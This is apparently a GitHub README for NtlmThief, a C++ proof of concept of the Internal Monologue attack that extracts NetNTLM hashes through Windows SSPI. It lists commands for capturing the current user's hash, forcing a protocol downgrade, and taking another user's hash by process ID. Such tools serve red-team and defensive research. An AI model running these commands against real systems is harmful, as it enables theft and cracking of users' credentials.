# NtlmThief

This is a C++ implementation of the Internal Monologue attack. It allows to get NetNTLM hashes of users using SSPI.

# Usage
It's Internal Monologue POC on C++. 

```shell
# Current User NetNTLM
.\NtlmThief.exe

# With Downgrade
.\NtlmThief.exe -downgrade

# Other user NetNTLM (PID - Process Id of other user)
.\NtlmThief.exe -pid 123
```

![изображение](https://github.com/MzHmO/NtlmThief/assets/92790655/de387240-c202-4d5c-9693-fa4b9e004212)
